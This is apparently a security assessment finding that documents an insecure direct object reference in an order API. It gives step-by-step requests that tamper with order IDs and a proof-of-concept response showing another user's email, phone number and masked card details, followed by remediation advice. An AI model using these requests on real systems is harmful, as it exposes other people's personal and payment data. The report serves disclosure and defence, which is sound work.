# Insecure Direct Object Reference (IDOR) in Order Details & Mechanic Report APIs

## Severity
High

## CWE
CWE-639 - Authorization Bypass Through User-Controlled Key

## OWASP Mapping
OWASP API Top 10:
- API1:2023 - Broken Object Level Authorization (BOLA)
- API3:2019 - Excessive Data Exposure (Legacy mapping overlap)

---

## Affected Endpoints

### 1. Browser-Level Endpoint (Frontend Access)
GET /orders?order_id={id}

Example:
https://merlin-declivitous-crowdedly.ngrok-free.dev/orders?order_id=8

### 2. Backend API Endpoint (Direct API Access)
GET /workshop/api/shop/orders/{order_id}

Example:
GET /workshop/api/shop/orders/5 HTTP/2

---

## Description

The application is vulnerable to **Insecure Direct Object Reference (IDOR)** in both:

- Browser-based order detail page
- Backend API order retrieval endpoint

The application uses predictable numeric identifiers (`order_id`) without enforcing proper authorization checks.

As a result, an authenticated user can access **other users' order data simply by modifying the ID value**, without any ownership verification.

This leads to unauthorized disclosure of:

- Personal user information
- Order history
- Payment details (masked card data still sensitive)
- Transaction metadata

---

## Steps to Reproduce

### Step 1: Access Legitimate Order (Browser)

1. Login as attacker user
2. Navigate to past orders page
3. Click **Details Order**
4. Observe request:

```
GET /orders?order_id=8
```

---

### Step 2: Modify Order ID (Browser IDOR)

Change:

```
order_id=8 → order_id=3
```

Result:
- Displays order belonging to another user (e.g., robot001@example.com)

---

### Step 3: Direct Backend API Exploitation

Intercept or manually send request:

```
GET /workshop/api/shop/orders/5 HTTP/2
Host: merlin-declivitous-crowdedly.ngrok-free.dev
Authorization: Bearer <attacker-token>
```

---

## Proof of Concept (API Response)

### Request
```
GET /workshop/api/shop/orders/5
```

### Request Evidence
```
evidence/requests/IDOR/order-id-IDOR.txt
```


### Response
```json
{
  "order": {
    "id": 5,
    "user": {
      "email": "admin@example.com",
      "number": "9010203040"
    },
    "product": {
      "id": 1,
      "name": "Seat",
      "price": "10.00",
      "image_url": "images/seat.svg"
    },
    "quantity": 2,
    "status": "delivered",
    "transaction_id": "359912f6-936c-4df9-9c51-f4ba74cb74f5",
    "created_on": "2026-05-07T04:58:20.548397"
  },
  "payment": {
    "transaction_id": "359912f6-936c-4df9-9c51-f4ba74cb74f5",
    "order_id": 5,
    "amount": 20,
    "paid_on": "2026-05-07T04:58:20.548397",
    "card_number": "XXXXXXXXXXXX3656",
    "card_owner_name": "Admin",
    "card_type": "MasterCard",
    "card_expiry": "10/2029",
    "currency": "USD"
  }
}
```
### Response Evidence
```
evidence/requests/IDOR/order-id-IDOR.txt
```
---

## Screenshot Evidence

- Browser IDOR: `/orders?order_id=8`
- Modified request: `/orders?order_id=3`
- API response: `/workshop/api/shop/orders/5`

Path:
```
evidence/screenshots/IDOR/Order-Id-IDOR/
```

---

## Impact

- Unauthorized access to other users’ orders
- Exposure of sensitive financial metadata
- Leakage of user identity (email/phone)
- Enumeration of valid order IDs
- Potential chaining with payment fraud attacks
- Full breakdown of object-level authorization

Confidentiality: High  
Integrity: Medium  
Availability: Low  

---

## Risk Rating
High

---

## Root Cause

The application directly uses user-controlled object identifiers (`order_id`) without:

- Ownership validation
- Session-to-object binding
- Access control checks at API layer

---

## Remediation

- Implement Object-Level Authorization checks
- Ensure user can only access their own order records
- Validate ownership on every request:
  - user_id == order.owner_id
- Avoid predictable sequential IDs (use UUIDs where possible)
- Enforce authorization at backend service layer (not frontend only)
- Add centralized authorization middleware
- Log and monitor IDOR access attempts

---

## References

- OWASP API Security Top 10 (2023): API1 - BOLA  
  https://owasp.org/API-Security/editions/2023/en/0xa1-broken-object-level-authorization/

- OWASP API Security Top 10 (2019): API3 - Excessive Data Exposure  
  https://owasp.org/www-project-api-security/

- CWE-639: Authorization Bypass Through User-Controlled Key  
  https://cwe.mitre.org/data/definitions/639.html

- PortSwigger IDOR Reference  
  https://portswigger.net/web-security/access-control/idor
```
